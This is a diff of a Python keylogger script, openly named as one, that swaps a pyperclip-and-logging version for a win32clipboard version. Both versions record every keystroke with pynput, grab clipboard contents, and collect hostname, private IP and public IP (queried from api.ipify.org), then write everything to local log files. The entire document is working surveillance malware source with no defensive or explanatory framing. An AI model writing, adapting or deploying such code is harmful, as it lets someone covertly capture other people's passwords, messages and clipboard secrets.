@@ -1,77 +1,94 @@
+
 import socket
 import platform
-import pyperclip
+import win32clipboard
 from pynput.keyboard import Key, Listener
 import time
 from requests import get
-import logging
 
-logging.basicConfig(filename='keylogger.log', level=logging.INFO, format='%(asctime)s - %(message)s')
-
-keys_info_file = "key_log.txt"
-system_info_file = "system_info.txt"
-clipboard_info_file = "clipboard_info.txt"
-
-def get_system_info():
-    try:
-        hostname = socket.gethostname()
-        ip = socket.gethostbyname(hostname)
-        public_ip = get("https://api.ipify.org").text
-        processor = platform.processor()
-        system = platform.system() + " " + platform.version()
-        machine = platform.machine()
-
-        with open(system_info_file, "w") as f:
-            f.write(f"Public IP Address: {public_ip}\n")
-            f.write(f"Processor: {processor}\n")
-            f.write(f"System: {system}\n")
-            f.write(f"Machine: {machine}\n")
-            f.write(f"Hostname: {hostname}\n")
-            f.write(f"Private IP Address: {ip}\n")
-
-        logging.info("System information logged successfully.")
-    except Exception as e:
-        logging.error(f"Error logging system information: {e}")
+keysInfo = "key_log.txt"
+systemInfo = "system_info.txt"
+clipboardInfo = "clipboard_info.txt"
 
 
-def get_clipboard_info():
-    try:
-        pasted_data = pyperclip.paste()
+def aboutSystem():
+    with open(systemInfo, "w") as f:
+        HOSTNAME = socket.gethostname()
+        IP = socket.gethostbyname(HOSTNAME)
 
-        with open(clipboard_info_file, "a") as f:
-            f.write(f"[Time: {time.time()}]: \n{pasted_data}\n")
+        try:
+            publicIP = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + publicIP)
+        except:
+            f.write("[ERROR]: Failed to fetch Public IP.")
+        
+        f.write("Processor: " + platform.processor() + "\n")
+        f.write("System: " + platform.system() + " " + platform.version() + "\n")
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + HOSTNAME + "\n")
+        f.write("Private IP Address: " + IP + "\n")
 
-        logging.info("Clipboard information logged successfully.")
-    except Exception as e:
-        logging.error(f"Error logging clipboard information: {e}")
+
+def hackClipboard():
+    with open(clipboardInfo, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pastedData = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write(f"[Time: {time.time()}]: \n" + pastedData)
+        except:
+            f.write("[ERROR]: Failed to fetch clipboard contents.")
+
+aboutSystem()
+print("[LOG]: System Info Logged")
+
+hackClipboard()
+print("[LOG]: ClipBoard Info Logged")
+
+print(f"[LOG [{time.time()}]]: KeyLogger Active.")
+
+with open(keysInfo, "a") as f:
+    f.write(f"[LOG [{time.time()}]]: KeyLogger Active.\n")
+    f.write(f"[{time.time()}]\n")
+    f.write("[LOG]: System Info Logged\n")
+    f.write("[LOG]: ClipBoard Info Logged\n")
 
 
-def on_press(key):
-    try:
-        logging.info(f"Key pressed: {key}")
+while True:
+    count = 0
+    keys = []
+
+    def onPress(key):
+        global keys, count, currentTime
+        print(f"{key} pressed")
+        keys.append(key)
+        count += 1
+        currentTime = time.time()
+
+        if count >= 1:
+            count = 0
+            writeLog(keys)
+            keys = []
+    
+    def writeLog(keys):
+        with open(keysInfo, "a") as f:
+            for key in keys:
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    f.write('\n')
+                if key == Key.enter:
+                    f.write("\n")
+                if key == Key.esc:
+                    print("[LOG]: KeyLogger Closed.")   
+                    exit()
+                if k.find("Key") == -1:
+                    f.write(k)
+                f.close()
+    
+    def onRelease(key):
         if key == Key.esc:
-            logging.info("KeyLogger closed.")
             return False
-    except Exception as e:
-        logging.error(f"Error processing key press: {e}")
-
-
-def start_keylogger():
-    try:
-        with open(keys_info_file, "a") as f:
-            f.write(f"[LOG [{time.time()}]]: KeyLogger Active.\n")
-            f.write(f"[{time.time()}]\n")
-            f.write("[LOG]: System Info Logged\n")
-            f.write("[LOG]: ClipBoard Info Logged\n")
-
-        logging.info("KeyLogger started.")
-
-        with Listener(on_press=on_press) as listener:
-            listener.join()
-    except Exception as e:
-        logging.error(f"Error starting keylogger: {e}")
-
-if __name__ == "__main__":
-    get_system_info()
-    get_clipboard_info()
-    start_keylogger()
+        
+    with Listener(on_press = onPress, on_release = onRelease) as listener:
+        listener.join()
